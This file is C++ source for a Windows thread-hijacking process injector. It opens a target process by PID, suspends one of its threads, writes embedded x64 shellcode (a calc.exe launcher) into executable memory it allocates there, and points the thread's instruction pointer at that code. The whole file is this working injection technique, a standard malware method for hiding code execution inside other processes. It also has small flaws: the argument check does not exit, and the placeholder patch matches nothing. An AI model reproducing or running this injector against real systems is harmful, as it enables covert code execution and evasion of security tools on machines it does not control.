#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		std::cout << "Usage: " << argv[0] << " <PID>" << std::endl;
	}

	DWORD targetPID = std::stoi(argv[1]);

	unsigned char shellcode[] = {
		0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
		0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
		0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
		0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
		0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
		0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
		0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
		0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
		0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
		0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
		0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
		0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
		0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
		0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
		0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
		0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
		0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
		0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
		0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
		0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
		0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
		0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
		0xc3
	};
	uint64_t shellcodeSize = sizeof shellcode;

	HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context;

	// DWORD targetPID = 15048; 
	CONTEXT originalContext;
	originalContext.ContextFlags = CONTEXT_FULL;
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	

	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

	SuspendThread(threadHijacked);
	GetThreadContext(threadHijacked, &originalContext);

	uint64_t originalRip = originalContext.Rip; // Assume this holds the original RIP value
	std::cout << "RIP: " << (originalRip) << std::endl;
	for (size_t i = 0; i < shellcodeSize - sizeof(originalRip); ++i) {
		if (memcmp(&shellcode[i], "\x58\x58\x58\x58\x58\x58\x58\x58", 8) == 0) { // Placeholder: 8 bytes of 'X'
			memcpy(&shellcode[i], &originalRip, sizeof(originalRip));
			break;
		}
	}

	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);

	

	
	GetThreadContext(threadHijacked, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);

	ResumeThread(threadHijacked);

	// Wait for a presumed safe duration for the shellcode to execute.
// WARNING: This is inherently unreliable!
	//Sleep(1000); // Example wait time; adjust based on expected shellcode execution time.

	// Attempt to restore the original thread context.
	// This assumes the shellcode doesn't alter the context in a way that makes restoration invalid.
	//SuspendThread(threadHijacked);
	//SetThreadContext(threadHijacked, &originalContext); // originalContext should be saved before modification
	//ResumeThread(threadHijacked);
}